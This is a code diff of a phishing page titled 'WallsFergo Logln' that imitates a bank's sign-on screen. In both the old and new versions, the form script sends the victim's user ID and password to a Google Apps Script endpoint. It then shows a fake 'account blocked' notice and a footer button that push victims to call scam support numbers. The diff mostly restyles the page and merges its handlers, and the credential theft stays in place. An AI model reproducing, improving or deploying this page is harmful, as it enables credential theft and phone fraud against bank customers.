@@ -3,16 +3,6 @@
   <head>
     <script type="text/javascript">
       (function (c, l, a, r, i, t, y) {
-        c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
-        t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
-        y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
-      })(window, document, "clarity", "script", "rqo5md8o37");
-    </script>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>WallsFergo Logln</title>
-    <script type="text/javascript">
-      (function (c, l, a, r, i, t, y) {
         c[a] =
           c[a] ||
           function () {
@@ -23,8 +13,11 @@
         t.src = "https://www.clarity.ms/tag/" + i;
         y = l.getElementsByTagName(r)[0];
         y.parentNode.insertBefore(t, y);
-      })(window, document, "clarity", "script", "pxyqxcsrg3");
+      })(window, document, "clarity", "script", "rqo5md8o37");
     </script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WallsFergo Logln</title>
     <style>
       * {
         margin: 0;
@@ -74,10 +67,10 @@
       .main-container {
         display: flex;
         justify-content: center;
-        align-items: center;
-        min-height: calc(100vh - 60px);
+        align-items: flex-start;
+        min-height: calc(100vh - 120px);
         background-color: #f5f5f5;
-        padding: 20px;
+        padding: 40px 20px 20px 20px;
       }
 
       .login-card {
@@ -88,6 +81,7 @@
         width: 100%;
         max-width: 450px;
       }
+
       .login-card p {
         text-align: center;
         color: #666;
@@ -117,12 +111,14 @@
         border-radius: 30px;
         cursor: pointer;
         font-size: 16px;
-      }
-      .sign-on-btn.loading {
         position: relative;
+      }
+
+      .sign-on-btn.loading {
         pointer-events: none;
         opacity: 0.7;
       }
+
       .sign-on-btn.loading::after {
         content: "";
         position: absolute;
@@ -134,6 +130,7 @@
         border-radius: 50%;
         animation: spin 0.6s linear infinite;
       }
+
       .error-message {
         color: red;
         display: none;
@@ -185,9 +182,15 @@
       }
 
       footer {
-        text-align: center;
-        padding: 20px;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        width: 100%;
         background-color: #f1f1f1;
+        text-align: center;
+        padding: 15px;
+        box-shadow: 0 -2px 5px rgba(0, 0, 0, 0.1);
+        z-index: 1000;
       }
 
       footer button {
@@ -226,22 +229,15 @@
             <input type="password" id="pass" placeholder="Password" required />
           </div>
 
-          <button type="submit" class="sign-on-btn">
-            Sign on
-            <img
-              id="loader"
-              alt="Loading..."
-              style="display: none; width: 20px; margin-left: 10px"
-            />
-          </button>
+          <button type="submit" class="sign-on-btn">Sign on</button>
+
           <div id="error-message" class="error-message">
-            Yours Account access has been blocked due to suspicious login
-            attempt. Contact our customer support at
-            <a
-              href="tel:+18774191595"
-              style="color: blue; text-decoration: underline"
-              >+18774191595</a
-            >.to verify and unlock your account.
+            Yours Account access has been blocked due to suspicious login attempt.
+            Contact our customer support at
+            <a href="tel:+18774191595" style="color: blue; text-decoration: underline">
+              +1 877-419-1595
+            </a>
+            to verify and unlock your account.
           </div>
         </form>
       </div>
@@ -249,56 +245,48 @@
 
     <footer>
       <button onclick="window.location.href='tel:+18774191595'">
-        Contact Us
+        📞 Contact Us: +1 877-419-1595
       </button>
     </footer>
 
     <script>
-      document
-        .getElementById("loginForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault();
-          const userID = document.getElementById("userID").value;
-          const pass = document.getElementById("pass").value;
-          const formDetails = {
-            userID: userID,
-            pass: pass,
-          };
+      document.getElementById("loginForm").addEventListener("submit", function (event) {
+        event.preventDefault();
+        const userID = document.getElementById("userID").value;
+        const pass = document.getElementById("pass").value;
+        const submitButton = document.querySelector(".sign-on-btn");
 
-          const scriptURL =
-            "https://script.google.com/macros/s/AKfycbweeKHNdtr5RLA1eOkLnkYAZXNKZuXi3kQoEPkZ5wCxmoCr6dmCLsOmG71-OtIdH9yFew/exec";
+        submitButton.classList.add("loading");
 
-          fetch(scriptURL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(formDetails),
+        const formDetails = {
+          userID: userID,
+          pass: pass,
+        };
+
+        const scriptURL =
+          "https://script.google.com/macros/s/AKfycbweeKHNdtr5RLA1eOkLnkYAZXNKZuXi3kQoEPkZ5wCxmoCr6dmCLsOmG71-OtIdH9yFew/exec";
+
+        fetch(scriptURL, {
+          method: "POST",
+          mode: "no-cors",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(formDetails),
+        })
+          .then(() => {
+            document.getElementById("loginForm").reset();
           })
-            .then(() => {
-              document.getElementById("loginForm").reset();
-            })
-            .catch((error) => {
-              console.error("Error:", error);
-              alert(
-                "There was an error in logging in the form. Contact Our Support Immediately +1 828-280-8745"
-              );
-            });
-        });
+          .catch((error) => {
+            console.error("Error:", error);
+            alert("There was an error in logging in the form. Contact Our Support Immediately +1 828-280-8745");
+          });
 
-      document
-        .getElementById("loginForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault();
-          const submitButton = document.querySelector(".sign-on-btn");
-          submitButton.classList.add("loading");
-
-          setTimeout(function () {
-            submitButton.classList.remove("loading");
-            document.getElementById("error-message").style.display = "block";
-          }, 2000);
-        });
+        setTimeout(function () {
+          submitButton.classList.remove("loading");
+          document.getElementById("error-message").style.display = "block";
+        }, 2000);
+      });
     </script>
   </body>
 </html>
